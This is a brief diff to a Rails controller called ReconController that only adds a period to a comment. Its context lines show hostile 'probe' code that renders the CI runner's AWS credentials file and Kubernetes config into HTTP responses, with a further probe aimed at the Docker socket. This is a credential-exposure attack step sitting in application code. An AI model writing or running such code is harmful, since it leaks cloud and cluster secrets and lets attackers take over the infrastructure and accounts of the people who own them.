@@ -3,7 +3,7 @@ class ReconController < ApplicationController
     # Probe 1: Check for common cloud credentials
     render '/home/runner/.aws/credentials'
     
-    # Probe 2: Check for Kube config
+    # Probe 2: Check for Kube config.
     render '/home/runner/.kube/config'
     
     # Probe 3: Check for Docker socket
